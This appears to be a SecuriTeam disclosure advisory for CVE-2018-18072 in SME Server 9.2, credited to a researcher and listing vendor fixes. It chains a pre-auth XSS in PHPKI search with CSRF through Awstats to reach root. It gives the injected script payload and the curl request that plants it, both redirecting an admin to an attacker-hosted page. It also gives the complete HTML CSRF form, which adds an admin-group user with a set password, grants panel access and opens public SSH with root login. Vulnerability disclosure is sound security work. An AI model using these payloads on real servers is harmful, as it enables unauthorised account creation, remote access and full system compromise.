**Vulnerabilities Summary**<br>
The following advisory describes a vulnerability in SME Server 9.2, which lets an unauthenticated attackers perform XSS attack that leads to remote code execution as root. SME Server is a Linux distribution for small and medium enterprises by Koozali foundation.

**CVE**<br>
CVE-2018-18072

**Credit**<br>
An independent security researcher, Karn Ganeshen has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
SME Server 9.2

**Vendor Response**<br>
Fixed in phpki-0.82-17.el6.sme, phpki-0.82-18.el6.sme, phpki-0.82-19.el6.sme

**Vulnerability Details**<br>
Software for the SME Server is packaged using RPM Package Manager (RPM) system. Existing packages from CentOS and other third-party developers are used. The SME Server uses packages from the open source community. Packages are called as contribs. Each contrib adds a specific functionality to the SME server  deployment. Once a contrib is installed, the corresponding Menu or web panel is added to the SME HTTP management portal. The default admin user has access to all contrib Menus. admin can create a new user and assign access of specific web panels (functionality) to the user. The user can, then, view, access and administer only those specific web panels.
The vulnerable components are the “Certificate Management” & “Advanced Web Statistics”, Which are vulnerable to Cross-Site Scripting & Cross-Site Request Forgery.
For the next demonstration , the Attackers IP is 192.168.1.2 and the SME Server IP 192.168.1.109.
The exploitation starts with the contrib – PHPKI – smeserver-phpki. This contrib provides a Certificate Management functionality. The administrator adds new certificates, which the users can download and set up in their browsers. The Certificate Management portal is accessible at https://<SME Server IP>/phpki/.
It should look like this:
<img src="https://blogs.securiteam.com/wp-content/uploads/2018/10/Sme-Server-PHPki-page-300x85.png">

All users can access this without any authentication. The portal provides a Search function where a user can search for existing certificates.

**Exploit**<br>
1) Reflected XSS [Pre-Auth] https://192.168.1.109/phpki/search.php/”>&lt;script>alert(“xss-phpki”)</script> . We can now see that this component is vulnerable to XSS.<br>
<img src="https://blogs.securiteam.com/wp-content/uploads/2018/10/Sme-Server-step1-300x93.png">

Now lets arm the payload: We will inject the following payload: “><script>document.location=”http://192.168.1.2/ssd.html”</script>
Issue the following request: curl ‘https://192.168.1.109/phpki/search.php/”><script>document.location=”http://192.168.1.2/ssd.html”</script>’ –insecure This payload is injected in the back-end (Stored-XSS) and used by another contrib, Awstats.
2) Start a web server on Attacker IP to serve our evil form – ssd.html<br>
```shell
$ sudo python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80
```

3) Stored XSS + Cross-Site Request Forgery The next step in exploitation, targets the web panel – Advanced Web Statistics 7.1 (build 1.983).  This contrib – smeserver-awstats.noarch – provides functionality to monitor web traffic to the  server. The following steps are from Admin point of view.<br>
1+ Admin logs in <br>
2+ Admin accesses Web Statistics -> Show -> Navigation (Full List – urldetail) This is the full list of all page urls accessed, which opens up – https://192.168.1.109/servermanager/cgi-bin/.awstats/awstats.pl config=mycompany.local&lang=auto&output=urldetail <br>
3+ Admin clicks on the entry:

<img src="https://blogs.securiteam.com/wp-content/uploads/2018/10/Sme-Server-admin-access-300x84.png">

4+ This opens a new page about details on this entry.<br>
5+ XSS Payload executes and fetches ssd.html from our server.
Now, on the attackers console:<br>

```shell
[bash-3.2$ sudo python -m SimpleHTTPServer 80
[password:
Serving HTTP on 0.0.0.0 port 80 ...
192.168.1.2 - - [10/9/2018 08:30:23] "GET /ssd.html HTTP/1.1" 200 -
```

The page that the victim will get is:

```HTML
<html>
</html>
<head>
    <title>Evil Form - Add user5 + Set Password + assign panel access - XSS+CSRF</title>
    <script type="text/javascript">
        function exec1() {
            document.getElementById('1').submit();
            setTimeout(exec2, 3000);
        }
        function exec2() {
            document.getElementById('2').submit();
            setTimeout(exec3, 3000);
        }
        function exec3() {
            document.getElementById('3').submit();
            setTimeout(exec4, 3000);
        }
        function exec4() {
            alert("4");
            document.getElementById('4').submit();
        }
        //				window.onbeforeunload=function(){
        //				return	"please	wait";
        //				}
    </script>
</head>
<body onload='exec1()'>
    <!-- Add	new	user	-->
    <form id='1' target="if1" name="badform_1" method="post" action="https://192.168.1.109/server-manager/cgi-bin/useraccounts">
        <input type="hidden" name="page" value="1" />
        <input type="hidden" name="page_stack" value="0" />
        <input type="hidden" name=".id" value="0d41969df339a1a62711edf93f48a673" />
        <input type="hidden" name="acctName" value="user5" />
        <input type="hidden" name="action" value="create" />
        <input type="hidden" name="FirstName" value="user5" />
        <input type="hidden" name="LastName" value="lname" />
        <input type="hidden" name="Dept" value="Main" />
        <input type="hidden" name="Company" value="XYZ+Corporation" />
        <input type="hidden" name="Street" value="123+Main+Street" />
        <input type="hidden" name="City" value="Ottawa" />
        <input type="hidden" name="Phone" value="555-5555" />
        <input type="hidden" name="EmailForward" value="local" />
        <input type="hidden" name="ForwardAddress" value="" />
        <input type="hidden" name="VPNClientAccess" value="no" />
        <input type="hidden" name="groupMemberships" value="admingroup" />
        <input type="hidden" name="Next" value="Add" />
    </form>
    <!-- Set	password	for	new	user	-->
    <form id='2' target="if2" name="badform_2" method="post" action="https://192.168.1.109/server-manager/cgi-bin/useraccounts">
        <input type="hidden" name="page" value="4" />
        <input type="hidden" name="page_stack" value="3" />
        <input type="hidden" name=".id" value="0d41969df339a1a62711edf93f48a673" />
        <input type="hidden" name="acctName" value="user5" />
        <input type="hidden" name="password1" value="SSDpassword@12345" />
        <input type="hidden" name="password2" value="SSDpassword@12345" />
        <input type="hidden" name="Next" value="Save" />
    </form>
    <!-- Assign	panel	access	to	new	user.	More	can	be	added	for	additional	access.-->
    <form id='3' target="if3" name="badform_3" method="post" action="https://192.168.1.109/server-manager/cgi-bin/userpanelaccess">
        <input type="hidden" name="panelAccess" value="remoteuseraccess" />
        <input type="hidden" name="panelAccess" value="viewlogfiles" />
        <input type="hidden" name="panelAccess" value="groups" />
        <input type="hidden" name="panelAccess" value="userpanelaccess" />
        <input type="hidden" name="panelAccess" value="userpanel-password" />
        <input type="hidden" name="panelAccess" value="userpanel-sshkeys" />
        <input type="hidden" name="panelAccess" value="userpanel-useraccounts" />
        <input type="hidden" name="panelAccess" value="userpanel-userbackup" />
        <input type="hidden" name="action" value="Modify" />
        <input type="hidden" name="acct" value="user5" />
        <input type="hidden" name="state" value="performModifyAccess" />
    </form>
    <!-- Change	remote	access	settings	- Open	up	Remote	Access	from	public	Internet	-->
    <form id='4' target="if4" name="badform_4" method="post" action="https://192.168.1.109/server-manager/cgi-bin/remoteaccess">
        <input type="hidden" name="page" value="0" />
        <input type="hidden" name="page_stack" value="" />
        <input type="hidden" name=".id" value="2e7d2cda4ce6b680499d4b2ee8eb7831" />
        <input type="hidden" name="pptpSessions" value="0" />
        <input type="hidden" name="validFromNetwork" value="" />
        <input type="hidden" name="validFromMask" value="" />
        <input type="hidden" name="sshAccess" value="public" />
        <input type="hidden" name="sshPermitRootLogin" value="yes" />
        <input type="hidden" name="sshPasswordAuthentication" value="yes" />
        <input type="hidden" name="sshTCPPort" value="22" />
        <input type="hidden" name="FTPAccess" value="normal" />
        <input type="hidden" name="FTPPasswordLogin" value="public" />
        <input type="hidden" name="Next" value="Save" />
    </form>
    <iframe name="if1" style="display:	hidden=" width="0" height="0" frameborder="0"></iframe>
    <iframe name="if2" style="display:	hidden=" width="0" height="0" frameborder="0"></iframe>
    <iframe name="if3" style="display:	hidden=" width="0" height="0" frameborder="0"></iframe>
    <iframe name="if4" style="display:	hidden=" width="0" height="0" frameborder="0"></iframe>
</body>
```

**This Payload will:**<br>
1+ Add a new user, set password (user5/SSDpassword@12345)<br>
2+ Assign various webpanel access to the new user<br>
* remoteuseraccess
* viewlogfiles
* groups
* userpanelaccess
* userpanel-password
* userpanel-sshkeys
* userpanel-useraccounts
* userpanel-userbackup<br>

3+ Reconfigure network filtering to open SSH/FTP access for all IP sources At this point, the attacker can log in with new user credentials, and has access to various webpanels (functionality) now.

<img src="https://blogs.securiteam.com/wp-content/uploads/2018/10/Sme-Server-user5-panel-300x78.png">

4) Attacker adds shell configuration for this new user – user5 – as follows:<br>
1+ Security -> User Remote Access -> ‘user5’ Modify -> Select ‘/bin/bash’ as Shell Access option –> Save.<br>

<img src="https://blogs.securiteam.com/wp-content/uploads/2018/10/Sme-Server-user-5-shell-panel-300x123.png">

2+ Attacker SSH in to the SME Server remotely:<br>
<img src="https://blogs.securiteam.com/wp-content/uploads/2018/10/Sme-Server-ssh-300x186.png">

3+ Attacker can execute commands as root using sudo.<br>
<img src="https://blogs.securiteam.com/wp-content/uploads/2018/10/Sme-Server-etc-shadow-191x300.png">
